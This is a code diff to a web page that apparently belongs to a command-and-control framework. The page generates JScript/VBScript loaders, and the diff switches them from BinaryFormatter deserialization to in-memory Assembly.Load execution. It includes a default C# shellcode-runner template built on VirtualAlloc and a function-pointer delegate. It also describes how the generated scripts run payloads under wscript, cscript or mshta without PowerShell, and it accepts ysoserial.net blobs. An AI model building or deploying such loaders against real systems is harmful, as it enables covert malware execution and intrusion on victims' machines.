@@ -3,16 +3,17 @@
 
 <div class="tool-panel">
     <div class="tool-header">
-        <h3 class="tool-title">DotNetToJScript</h3>
-        <p class="tool-subtitle">Generate JScript/VBScript payloads that bootstrap .NET assemblies via BinaryFormatter deserialization.</p>
+        <h3 class="tool-title">Insecure Deserialization</h3>
+        <p class="tool-subtitle">Generate JScript/VBScript payloads that load and execute .NET assemblies in memory.</p>
     </div>
 
     <div class="loader-content">
         <div class="loader-section">
             <h4 class="loader-section-title">Overview</h4>
             <p class="loader-text">
-                Generates scripts that deserialize a .NET object via COM-accessible <code>BinaryFormatter</code>,
-                triggering your assembly's entry point without PowerShell or managed EXE — just
+                Generates scripts that load a .NET assembly from an embedded base64 blob via
+                <code>Assembly.Load(byte[])</code> and execute your entry class constructor —
+                no PowerShell, no managed EXE, just
                 <code>wscript.exe</code>, <code>cscript.exe</code>, or <code>mshta.exe</code>.
             </p>
         </div>
@@ -39,8 +40,7 @@
                 <div class="loader-tab-body">
                     <p class="loader-text loader-hint">
                         Write your entry class in C#. Compiled in-browser using Roslyn targeting .NET Framework
-                        @(_runtime == Runtime.Net4 ? "4.0" : "2.0"). The class must be <code>[Serializable]</code>
-                        and implement <code>IObjectReference</code>.
+                        @(_runtime == Runtime.Net4 ? "4.0" : "2.0"). Your payload runs in the constructor.
                     </p>
                     <textarea class="loader-textarea" @bind="_sourceCode" @bind:event="oninput"
                               rows="18" style="font-family:var(--font-mono);font-size:12px;tab-size:4;"></textarea>
@@ -73,8 +73,8 @@
             {
                 <div class="loader-tab-body">
                     <p class="loader-text loader-hint">
-                        Upload a .NET assembly DLL. The entry class must be <code>[Serializable]</code> and implement
-                        <code>IObjectReference</code> for code execution on deserialization.
+                        Upload a .NET assembly DLL. The script will load it via <code>Assembly.Load(byte[])</code>
+                        and call <code>CreateInstance</code> on your entry class.
                     </p>
                     <div class="loader-actions">
                         <label class="loader-link-btn" style="cursor:pointer">
@@ -86,11 +86,8 @@
                             <span class="loader-text">@_dllFileName (@FormatSize(_dllBytes?.Length ?? 0))</span>
                         }
                     </div>
-                    <C2Input Value="@_assemblyName" ValueChanged="v => { _assemblyName = v; Rebuild(); }" BindOnInput
-                             Placeholder="Assembly name (e.g. MyPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null)"
-                             CssClass="loader-input-spacing" />
                     <C2Input Value="@_typeName" ValueChanged="v => { _typeName = v; Rebuild(); }" BindOnInput
-                             Placeholder="Entry class (e.g. MyNamespace.TestClass)"
+                             Placeholder="Entry class (e.g. TestClass or MyNamespace.TestClass)"
                              CssClass="loader-input-spacing" />
                 </div>
             }
@@ -98,8 +95,8 @@
             {
                 <div class="loader-tab-body">
                     <p class="loader-text loader-hint">
-                        Paste a pre-serialized BinaryFormatter blob (base64). Use this if you generated
-                        the serialized stream externally with the original DotNetToJScript tool.
+                        Paste a pre-serialized BinaryFormatter blob (base64). Use this with payloads
+                        from ysoserial.net or the original DotNetToJScript tool.
                     </p>
                     <textarea class="loader-textarea" @bind="_rawBlob" @bind:event="oninput" @bind:after="RebuildFromBlob"
                               placeholder="AAEAAAD/////..." rows="4"></textarea>
@@ -166,9 +163,9 @@
             <h4 class="loader-section-title">How It Works</h4>
             <p class="loader-text">
                 1. Script sets target CLR version via <code>COMPLUS_Version</code> environment variable<br/>
-                2. Base64 payload is decoded to a <code>MemoryStream</code> using .NET COM objects<br/>
-                3. <code>BinaryFormatter.Deserialize</code> instantiates your class from the serialized stream<br/>
-                4. Your class's <code>IObjectReference.GetRealObject()</code> executes the payload<br/>
+                2. DLL bytes are decoded from the embedded base64 blob<br/>
+                3. <code>Assembly.Load(byte[])</code> loads the DLL into the process via COM reflection<br/>
+                4. <code>CreateInstance</code> instantiates your entry class — the constructor runs your payload<br/>
                 5. Runs under <code>wscript.exe</code> / <code>cscript.exe</code> / <code>mshta.exe</code> — no PowerShell needed
             </p>
         </div>
@@ -196,7 +193,6 @@
     // Upload mode
     private string _dllFileName = "";
     private byte[]? _dllBytes;
-    private string _assemblyName = "";
     private string _typeName = "";
 
     // Blob mode
@@ -217,17 +213,15 @@
 
     private const string DefaultTemplate = @"using System;
 using System.Runtime.InteropServices;
-using System.Runtime.Serialization;
 
-[Serializable, ComVisible(true)]
-public class TestClass : IObjectReference
+public class TestClass
 {
     delegate void Runner();
 
     [DllImport(""kernel32"")]
     static extern IntPtr VirtualAlloc(IntPtr a, uint sz, uint type, uint prot);
 
-    public object GetRealObject(StreamingContext ctx)
+    public TestClass()
     {
         // Replace with your shellcode
         byte[] buf = new byte[] { 0xcc };
@@ -238,8 +232,6 @@ public class TestClass : IObjectReference
 
         Runner run = (Runner)Marshal.GetDelegateForFunctionPointer(addr, typeof(Runner));
         run();
-
-        return this;
     }
 }";
 
@@ -274,15 +266,12 @@ public class TestClass : IObjectReference
         if (result.Success)
         {
             _dllBytes = result.Assembly;
-            _assemblyName = $"{_sourceAssemblyName}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
             _typeName = _sourceTypeName;
             _dllFileName = $"{_sourceAssemblyName}.dll";
             _compileSuccess = true;
 
-            var nrbf = D2JSGenerator.BuildNrbf(_sourceAssemblyName, _typeName);
-            var b64 = Convert.ToBase64String(nrbf);
             var dllB64 = Convert.ToBase64String(_dllBytes!);
-            _output = D2JSGenerator.Generate(b64, _typeName, _format, RuntimeVersion, dllB64);
+            _output = D2JSGenerator.Generate(dllB64, _typeName, _format, RuntimeVersion);
         }
         else
         {
@@ -304,11 +293,8 @@ public class TestClass : IObjectReference
         await stream.CopyToAsync(ms);
         _dllBytes = ms.ToArray();
 
-        if (string.IsNullOrEmpty(_assemblyName))
-        {
-            var name = System.IO.Path.GetFileNameWithoutExtension(file.Name);
-            _assemblyName = $"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
-        }
+        if (string.IsNullOrEmpty(_typeName))
+            _typeName = System.IO.Path.GetFileNameWithoutExtension(file.Name);
 
         Rebuild();
         StateHasChanged();
@@ -316,16 +302,14 @@ public class TestClass : IObjectReference
 
     private void Rebuild()
     {
-        if (string.IsNullOrWhiteSpace(_assemblyName) || string.IsNullOrWhiteSpace(_typeName))
+        if (_dllBytes is not { Length: > 0 } || string.IsNullOrWhiteSpace(_typeName))
         {
             _output = "";
             return;
         }
 
-        var nrbf = D2JSGenerator.BuildNrbf(_assemblyName, _typeName);
-        var b64 = Convert.ToBase64String(nrbf);
-        string? dllB64 = _dllBytes is { Length: > 0 } ? Convert.ToBase64String(_dllBytes) : null;
-        _output = D2JSGenerator.Generate(b64, _typeName, _format, RuntimeVersion, dllB64);
+        var dllB64 = Convert.ToBase64String(_dllBytes);
+        _output = D2JSGenerator.Generate(dllB64, _typeName, _format, RuntimeVersion);
     }
 
     private void RebuildFromBlob()
@@ -335,7 +319,7 @@ public class TestClass : IObjectReference
             _output = "";
             return;
         }
-        _output = D2JSGenerator.Generate(_rawBlob.Trim(), _typeName, _format, RuntimeVersion);
+        _output = D2JSGenerator.GenerateFromBlob(_rawBlob.Trim(), _format, RuntimeVersion);
     }
 
     private async Task Download()
